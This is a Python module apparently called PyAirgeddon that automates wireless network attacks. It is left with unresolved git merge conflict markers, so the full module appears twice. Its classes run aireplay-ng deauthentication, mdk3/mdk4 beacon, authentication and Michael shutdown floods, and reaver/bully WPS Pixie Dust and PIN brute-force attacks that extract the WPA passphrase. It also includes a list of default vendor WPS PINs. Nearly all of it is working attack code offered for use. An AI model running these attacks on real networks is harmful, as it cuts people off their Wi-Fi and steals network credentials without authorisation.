<<<<<<< HEAD
#!/usr/bin/env python3
"""
PyAirgeddon Attacks Module
Deauthentication, DoS, and WPS attacks
Requires: Linux with aircrack-ng suite, reaver, bully
"""

import subprocess
import threading
import time
import signal
import os
import re
from typing import Callable, Optional, List
from dataclasses import dataclass


@dataclass
class WPSResult:
    """Result of WPS attack"""
    success: bool
    pin: str = ""
    psk: str = ""
    message: str = ""


# ============================================================================
# DEAUTHENTICATION ATTACKS
# ============================================================================

class DeauthAttack:
    """
    Deauthentication attack to disconnect clients from AP
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.process = None
        self.packets_sent = 0
        
    def start(self, target_bssid: str, client_mac: str = None,
              count: int = 0, continuous: bool = True,
              log_callback: Callable = None):
        """
        Start deauth attack
        target_bssid: AP MAC address
        client_mac: Target client (None for broadcast)
        count: Number of deauth packets (0 for infinite)
        continuous: Keep running until stop() is called
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        if self.running:
            log("[-] Attack already running")
            return
        
        target = client_mac or 'FF:FF:FF:FF:FF:FF'
        log(f"[*] Starting deauth attack on {target_bssid}")
        log(f"[*] Target client: {target}")
        
        self.running = True
        self.packets_sent = 0
        
        def attack_loop():
            while self.running:
                try:
                    cmd = [
                        'aireplay-ng',
                        '--deauth', str(count) if count > 0 else '10',
                        '-a', target_bssid,
                    ]
                    
                    if client_mac:
                        cmd.extend(['-c', client_mac])
                    
                    cmd.append(self.interface)
                    
                    self.process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True
                    )
                    
                    for line in self.process.stdout:
                        if 'Sending' in line:
                            self.packets_sent += 1
                            if self.packets_sent % 10 == 0:
                                log(f"[+] Packets sent: {self.packets_sent}")
                    
                    self.process.wait()
                    
                    if not continuous or count > 0:
                        break
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    log(f"[-] Error: {e}")
                    break
            
            self.running = False
            log(f"[+] Deauth attack finished. Total packets: {self.packets_sent}")
        
        threading.Thread(target=attack_loop, daemon=True).start()
    
    def stop(self, log_callback: Callable = None):
        """Stop deauth attack"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        self.running = False
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=2)
            except:
                self.process.kill()
        log("[+] Deauth attack stopped")


# ============================================================================
# DENIAL OF SERVICE ATTACKS
# ============================================================================

class DoSAttack:
    """
    Multiple DoS attack methods using mdk3/mdk4
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.process = None
        
    def beacon_flood(self, count: int = 500, log_callback: Callable = None):
        """
        Beacon flood attack - flood area with fake APs
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting beacon flood attack with {count} fake APs...")
        self.running = True
        
        def attack():
            try:
                # Use mdk4 if available, fallback to mdk3
                for mdk in ['mdk4', 'mdk3']:
                    try:
                        cmd = [mdk, self.interface, 'b', '-n', str(count)]
                        self.process = subprocess.Popen(
                            cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        log(f"[+] Beacon flood started using {mdk}")
                        self.process.wait()
                        break
                    except FileNotFoundError:
                        continue
            except Exception as e:
                log(f"[-] Error: {e}")
            
            self.running = False
            log("[+] Beacon flood stopped")
        
        threading.Thread(target=attack, daemon=True).start()
    
    def auth_flood(self, target_bssid: str, log_callback: Callable = None):
        """
        Authentication flood attack against specific AP
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting auth flood attack on {target_bssid}...")
        self.running = True
        
        def attack():
            try:
                for mdk in ['mdk4', 'mdk3']:
                    try:
                        cmd = [mdk, self.interface, 'a', '-a', target_bssid]
                        self.process = subprocess.Popen(
                            cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        log(f"[+] Auth flood started using {mdk}")
                        self.process.wait()
                        break
                    except FileNotFoundError:
                        continue
            except Exception as e:
                log(f"[-] Error: {e}")
            
            self.running = False
            log("[+] Auth flood stopped")
        
        threading.Thread(target=attack, daemon=True).start()
    
    def michael_shutdown(self, target_bssid: str, log_callback: Callable = None):
        """
        Michael shutdown exploit for TKIP-enabled APs
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting Michael shutdown attack on {target_bssid}...")
        self.running = True
        
        def attack():
            try:
                for mdk in ['mdk4', 'mdk3']:
                    try:
                        cmd = [mdk, self.interface, 'm', '-t', target_bssid]
                        self.process = subprocess.Popen(
                            cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        log(f"[+] Michael shutdown started using {mdk}")
                        self.process.wait()
                        break
                    except FileNotFoundError:
                        continue
            except Exception as e:
                log(f"[-] Error: {e}")
            
            self.running = False
            log("[+] Michael shutdown stopped")
        
        threading.Thread(target=attack, daemon=True).start()
    
    def stop(self, log_callback: Callable = None):
        """Stop DoS attack"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        self.running = False
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=2)
            except:
                self.process.kill()
        log("[+] DoS attack stopped")


# ============================================================================
# WPS ATTACKS
# ============================================================================

class WPSAttack:
    """
    WPS PIN attacks:
    - Pixie Dust (offline attack)
    - Brute force PIN
    - Custom PIN
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.process = None
        
    def pixie_dust(self, target_bssid: str, channel: int,
                   log_callback: Callable = None,
                   progress_callback: Callable = None) -> WPSResult:
        """
        Pixie Dust attack (fast offline WPS attack)
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting Pixie Dust attack on {target_bssid}")
        
        # Set channel
        subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
                      capture_output=True)
        
        try:
            # Try reaver first
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', target_bssid,
                '-c', str(channel),
                '-K', '1',  # Pixie Dust attack
                '-vv'
            ]
            
            self.running = True
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            pin = ""
            psk = ""
            
            for line in self.process.stdout:
                log(f"    {line.strip()}")
                
                if 'WPS PIN:' in line:
                    pin = line.split(':')[-1].strip()
                if 'WPA PSK:' in line:
                    psk = line.split(':')[-1].strip()
                if 'WPS pin not found' in line.lower():
                    break
            
            self.process.wait()
            
            if pin and psk:
                log(f"[+] SUCCESS! PIN: {pin} | PSK: {psk}")
                return WPSResult(success=True, pin=pin, psk=psk,
                               message="Pixie Dust attack successful")
            elif pin:
                log(f"[+] Found PIN: {pin}")
                return WPSResult(success=True, pin=pin,
                               message="PIN found, but no PSK retrieved")
            else:
                log("[-] Pixie Dust attack failed")
                return WPSResult(success=False, message="Not vulnerable to Pixie Dust")
                
        except FileNotFoundError:
            log("[-] reaver not found, trying bully...")
            return self._pixie_dust_bully(target_bssid, channel, log_callback)
        except Exception as e:
            log(f"[-] Error: {e}")
            return WPSResult(success=False, message=str(e))
        finally:
            self.running = False
    
    def _pixie_dust_bully(self, target_bssid: str, channel: int,
                          log_callback: Callable = None) -> WPSResult:
        """Pixie Dust using bully"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        try:
            cmd = [
                'bully',
                '-b', target_bssid,
                '-c', str(channel),
                '-d', '-v', '3',
                self.interface
            ]
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            pin = ""
            psk = ""
            
            for line in self.process.stdout:
                log(f"    {line.strip()}")
                
                if 'Pin:' in line:
                    pin = line.split(':')[-1].strip()
                if 'Key:' in line:
                    psk = line.split(':')[-1].strip()
            
            self.process.wait()
            
            if pin:
                return WPSResult(success=True, pin=pin, psk=psk,
                               message="Bully Pixie Dust successful")
            return WPSResult(success=False, message="Bully attack failed")
            
        except FileNotFoundError:
            log("[-] bully not found")
            return WPSResult(success=False, message="Neither reaver nor bully installed")
        except Exception as e:
            return WPSResult(success=False, message=str(e))
    
    def brute_force_pin(self, target_bssid: str, channel: int,
                        start_pin: str = None, timeout: int = 0,
                        log_callback: Callable = None,
                        progress_callback: Callable = None) -> WPSResult:
        """
        Brute force WPS PIN attack
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting WPS PIN brute force on {target_bssid}")
        log("[!] This attack can take several hours...")
        
        subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
                      capture_output=True)
        
        try:
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', target_bssid,
                '-c', str(channel),
                '-vv',
                '-N',  # Don't send NACK
                '-d', '1',  # Delay between attempts
            ]
            
            if start_pin:
                cmd.extend(['-p', start_pin])
            
            self.running = True
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            pin = ""
            psk = ""
            progress = 0
            
            for line in self.process.stdout:
                if not self.running:
                    break
                    
                log(f"    {line.strip()}")
                
                # Extract progress
                if '%' in line:
                    try:
                        match = re.search(r'(\d+\.?\d*)%', line)
                        if match:
                            progress = float(match.group(1))
                            if progress_callback:
                                progress_callback(progress)
                    except:
                        pass
                
                if 'WPS PIN:' in line:
                    pin = line.split(':')[-1].strip()
                if 'WPA PSK:' in line:
                    psk = line.split(':')[-1].strip()
            
            self.process.wait()
            
            if pin:
                log(f"[+] SUCCESS! PIN: {pin} | PSK: {psk}")
                return WPSResult(success=True, pin=pin, psk=psk,
                               message="Brute force successful")
            return WPSResult(success=False, message="Brute force failed or stopped")
            
        except Exception as e:
            log(f"[-] Error: {e}")
            return WPSResult(success=False, message=str(e))
        finally:
            self.running = False
    
    def custom_pin(self, target_bssid: str, channel: int, pin: str,
                   log_callback: Callable = None) -> WPSResult:
        """
        Try specific WPS PIN
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Trying PIN {pin} on {target_bssid}")
        
        subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
                      capture_output=True)
        
        try:
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', target_bssid,
                '-c', str(channel),
                '-p', pin,
                '-vv',
                '-L'  # Limit to single attempt
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if 'WPA PSK:' in result.stdout:
                psk = ""
                for line in result.stdout.split('\n'):
                    if 'WPA PSK:' in line:
                        psk = line.split(':')[-1].strip()
                        break
                log(f"[+] SUCCESS! PSK: {psk}")
                return WPSResult(success=True, pin=pin, psk=psk,
                               message="PIN valid")
            
            log("[-] PIN invalid")
            return WPSResult(success=False, message="PIN invalid")
            
        except subprocess.TimeoutExpired:
            log("[-] Timeout")
            return WPSResult(success=False, message="Timeout")
        except Exception as e:
            log(f"[-] Error: {e}")
            return WPSResult(success=False, message=str(e))
    
    def generate_common_pins(self) -> List[str]:
        """Generate list of common default WPS PINs"""
        common_pins = [
            '12345670', '00000000', '11111111', '22222222',
            '33333333', '44444444', '55555555', '66666666',
            '77777777', '88888888', '99999999', '12340000',
            '12341234', '20172017', '46264848', '76229909',
            # Known vendor default PINs
            '28296607', '72242369', '15323813', '00448506',
            '48478849', '76508058', '53540809', '57555069'
        ]
        return common_pins
    
    def stop(self, log_callback: Callable = None):
        """Stop WPS attack"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        self.running = False
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=2)
            except:
                self.process.kill()
        log("[+] WPS attack stopped")


# ============================================================================
# MAIN (for testing)
# ============================================================================

if __name__ == "__main__":
    print("[*] PyAirgeddon Attacks Module")
    print("[!] This module requires root privileges and Linux")
    print("[!] Run specific attack classes with appropriate interface")
=======
#!/usr/bin/env python3
"""
PyAirgeddon Attacks Module
Deauthentication, DoS, and WPS attacks
Requires: Linux with aircrack-ng suite, reaver, bully
"""

import subprocess
import threading
import time
import signal
import os
import re
from typing import Callable, Optional, List
from dataclasses import dataclass


@dataclass
class WPSResult:
    """Result of WPS attack"""
    success: bool
    pin: str = ""
    psk: str = ""
    message: str = ""


# ============================================================================
# DEAUTHENTICATION ATTACKS
# ============================================================================

class DeauthAttack:
    """
    Deauthentication attack to disconnect clients from AP
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.process = None
        self.packets_sent = 0
        
    def start(self, target_bssid: str, client_mac: str = None,
              count: int = 0, continuous: bool = True,
              log_callback: Callable = None):
        """
        Start deauth attack
        target_bssid: AP MAC address
        client_mac: Target client (None for broadcast)
        count: Number of deauth packets (0 for infinite)
        continuous: Keep running until stop() is called
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        if self.running:
            log("[-] Attack already running")
            return
        
        target = client_mac or 'FF:FF:FF:FF:FF:FF'
        log(f"[*] Starting deauth attack on {target_bssid}")
        log(f"[*] Target client: {target}")
        
        self.running = True
        self.packets_sent = 0
        
        def attack_loop():
            while self.running:
                try:
                    cmd = [
                        'aireplay-ng',
                        '--deauth', str(count) if count > 0 else '10',
                        '-a', target_bssid,
                    ]
                    
                    if client_mac:
                        cmd.extend(['-c', client_mac])
                    
                    cmd.append(self.interface)
                    
                    self.process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True
                    )
                    
                    for line in self.process.stdout:
                        if 'Sending' in line:
                            self.packets_sent += 1
                            if self.packets_sent % 10 == 0:
                                log(f"[+] Packets sent: {self.packets_sent}")
                    
                    self.process.wait()
                    
                    if not continuous or count > 0:
                        break
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    log(f"[-] Error: {e}")
                    break
            
            self.running = False
            log(f"[+] Deauth attack finished. Total packets: {self.packets_sent}")
        
        threading.Thread(target=attack_loop, daemon=True).start()
    
    def stop(self, log_callback: Callable = None):
        """Stop deauth attack"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        self.running = False
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=2)
            except:
                self.process.kill()
        log("[+] Deauth attack stopped")


# ============================================================================
# DENIAL OF SERVICE ATTACKS
# ============================================================================

class DoSAttack:
    """
    Multiple DoS attack methods using mdk3/mdk4
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.process = None
        
    def beacon_flood(self, count: int = 500, log_callback: Callable = None):
        """
        Beacon flood attack - flood area with fake APs
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting beacon flood attack with {count} fake APs...")
        self.running = True
        
        def attack():
            try:
                # Use mdk4 if available, fallback to mdk3
                for mdk in ['mdk4', 'mdk3']:
                    try:
                        cmd = [mdk, self.interface, 'b', '-n', str(count)]
                        self.process = subprocess.Popen(
                            cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        log(f"[+] Beacon flood started using {mdk}")
                        self.process.wait()
                        break
                    except FileNotFoundError:
                        continue
            except Exception as e:
                log(f"[-] Error: {e}")
            
            self.running = False
            log("[+] Beacon flood stopped")
        
        threading.Thread(target=attack, daemon=True).start()
    
    def auth_flood(self, target_bssid: str, log_callback: Callable = None):
        """
        Authentication flood attack against specific AP
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting auth flood attack on {target_bssid}...")
        self.running = True
        
        def attack():
            try:
                for mdk in ['mdk4', 'mdk3']:
                    try:
                        cmd = [mdk, self.interface, 'a', '-a', target_bssid]
                        self.process = subprocess.Popen(
                            cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        log(f"[+] Auth flood started using {mdk}")
                        self.process.wait()
                        break
                    except FileNotFoundError:
                        continue
            except Exception as e:
                log(f"[-] Error: {e}")
            
            self.running = False
            log("[+] Auth flood stopped")
        
        threading.Thread(target=attack, daemon=True).start()
    
    def michael_shutdown(self, target_bssid: str, log_callback: Callable = None):
        """
        Michael shutdown exploit for TKIP-enabled APs
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting Michael shutdown attack on {target_bssid}...")
        self.running = True
        
        def attack():
            try:
                for mdk in ['mdk4', 'mdk3']:
                    try:
                        cmd = [mdk, self.interface, 'm', '-t', target_bssid]
                        self.process = subprocess.Popen(
                            cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        log(f"[+] Michael shutdown started using {mdk}")
                        self.process.wait()
                        break
                    except FileNotFoundError:
                        continue
            except Exception as e:
                log(f"[-] Error: {e}")
            
            self.running = False
            log("[+] Michael shutdown stopped")
        
        threading.Thread(target=attack, daemon=True).start()
    
    def stop(self, log_callback: Callable = None):
        """Stop DoS attack"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        self.running = False
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=2)
            except:
                self.process.kill()
        log("[+] DoS attack stopped")


# ============================================================================
# WPS ATTACKS
# ============================================================================

class WPSAttack:
    """
    WPS PIN attacks:
    - Pixie Dust (offline attack)
    - Brute force PIN
    - Custom PIN
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.process = None
        
    def pixie_dust(self, target_bssid: str, channel: int,
                   log_callback: Callable = None,
                   progress_callback: Callable = None) -> WPSResult:
        """
        Pixie Dust attack (fast offline WPS attack)
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting Pixie Dust attack on {target_bssid}")
        
        # Set channel
        subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
                      capture_output=True)
        
        try:
            # Try reaver first
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', target_bssid,
                '-c', str(channel),
                '-K', '1',  # Pixie Dust attack
                '-vv'
            ]
            
            self.running = True
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            pin = ""
            psk = ""
            
            for line in self.process.stdout:
                log(f"    {line.strip()}")
                
                if 'WPS PIN:' in line:
                    pin = line.split(':')[-1].strip()
                if 'WPA PSK:' in line:
                    psk = line.split(':')[-1].strip()
                if 'WPS pin not found' in line.lower():
                    break
            
            self.process.wait()
            
            if pin and psk:
                log(f"[+] SUCCESS! PIN: {pin} | PSK: {psk}")
                return WPSResult(success=True, pin=pin, psk=psk,
                               message="Pixie Dust attack successful")
            elif pin:
                log(f"[+] Found PIN: {pin}")
                return WPSResult(success=True, pin=pin,
                               message="PIN found, but no PSK retrieved")
            else:
                log("[-] Pixie Dust attack failed")
                return WPSResult(success=False, message="Not vulnerable to Pixie Dust")
                
        except FileNotFoundError:
            log("[-] reaver not found, trying bully...")
            return self._pixie_dust_bully(target_bssid, channel, log_callback)
        except Exception as e:
            log(f"[-] Error: {e}")
            return WPSResult(success=False, message=str(e))
        finally:
            self.running = False
    
    def _pixie_dust_bully(self, target_bssid: str, channel: int,
                          log_callback: Callable = None) -> WPSResult:
        """Pixie Dust using bully"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        try:
            cmd = [
                'bully',
                '-b', target_bssid,
                '-c', str(channel),
                '-d', '-v', '3',
                self.interface
            ]
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            pin = ""
            psk = ""
            
            for line in self.process.stdout:
                log(f"    {line.strip()}")
                
                if 'Pin:' in line:
                    pin = line.split(':')[-1].strip()
                if 'Key:' in line:
                    psk = line.split(':')[-1].strip()
            
            self.process.wait()
            
            if pin:
                return WPSResult(success=True, pin=pin, psk=psk,
                               message="Bully Pixie Dust successful")
            return WPSResult(success=False, message="Bully attack failed")
            
        except FileNotFoundError:
            log("[-] bully not found")
            return WPSResult(success=False, message="Neither reaver nor bully installed")
        except Exception as e:
            return WPSResult(success=False, message=str(e))
    
    def brute_force_pin(self, target_bssid: str, channel: int,
                        start_pin: str = None, timeout: int = 0,
                        log_callback: Callable = None,
                        progress_callback: Callable = None) -> WPSResult:
        """
        Brute force WPS PIN attack
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Starting WPS PIN brute force on {target_bssid}")
        log("[!] This attack can take several hours...")
        
        subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
                      capture_output=True)
        
        try:
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', target_bssid,
                '-c', str(channel),
                '-vv',
                '-N',  # Don't send NACK
                '-d', '1',  # Delay between attempts
            ]
            
            if start_pin:
                cmd.extend(['-p', start_pin])
            
            self.running = True
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            pin = ""
            psk = ""
            progress = 0
            
            for line in self.process.stdout:
                if not self.running:
                    break
                    
                log(f"    {line.strip()}")
                
                # Extract progress
                if '%' in line:
                    try:
                        match = re.search(r'(\d+\.?\d*)%', line)
                        if match:
                            progress = float(match.group(1))
                            if progress_callback:
                                progress_callback(progress)
                    except:
                        pass
                
                if 'WPS PIN:' in line:
                    pin = line.split(':')[-1].strip()
                if 'WPA PSK:' in line:
                    psk = line.split(':')[-1].strip()
            
            self.process.wait()
            
            if pin:
                log(f"[+] SUCCESS! PIN: {pin} | PSK: {psk}")
                return WPSResult(success=True, pin=pin, psk=psk,
                               message="Brute force successful")
            return WPSResult(success=False, message="Brute force failed or stopped")
            
        except Exception as e:
            log(f"[-] Error: {e}")
            return WPSResult(success=False, message=str(e))
        finally:
            self.running = False
    
    def custom_pin(self, target_bssid: str, channel: int, pin: str,
                   log_callback: Callable = None) -> WPSResult:
        """
        Try specific WPS PIN
        """
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Trying PIN {pin} on {target_bssid}")
        
        subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
                      capture_output=True)
        
        try:
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', target_bssid,
                '-c', str(channel),
                '-p', pin,
                '-vv',
                '-L'  # Limit to single attempt
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if 'WPA PSK:' in result.stdout:
                psk = ""
                for line in result.stdout.split('\n'):
                    if 'WPA PSK:' in line:
                        psk = line.split(':')[-1].strip()
                        break
                log(f"[+] SUCCESS! PSK: {psk}")
                return WPSResult(success=True, pin=pin, psk=psk,
                               message="PIN valid")
            
            log("[-] PIN invalid")
            return WPSResult(success=False, message="PIN invalid")
            
        except subprocess.TimeoutExpired:
            log("[-] Timeout")
            return WPSResult(success=False, message="Timeout")
        except Exception as e:
            log(f"[-] Error: {e}")
            return WPSResult(success=False, message=str(e))
    
    def generate_common_pins(self) -> List[str]:
        """Generate list of common default WPS PINs"""
        common_pins = [
            '12345670', '00000000', '11111111', '22222222',
            '33333333', '44444444', '55555555', '66666666',
            '77777777', '88888888', '99999999', '12340000',
            '12341234', '20172017', '46264848', '76229909',
            # Known vendor default PINs
            '28296607', '72242369', '15323813', '00448506',
            '48478849', '76508058', '53540809', '57555069'
        ]
        return common_pins
    
    def stop(self, log_callback: Callable = None):
        """Stop WPS attack"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        self.running = False
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=2)
            except:
                self.process.kill()
        log("[+] WPS attack stopped")


# ============================================================================
# MAIN (for testing)
# ============================================================================

if __name__ == "__main__":
    print("[*] PyAirgeddon Attacks Module")
    print("[!] This module requires root privileges and Linux")
    print("[!] Run specific attack classes with appropriate interface")
>>>>>>> 7a1df55f49f3097f4e39d6a09d98fe1482ca394e
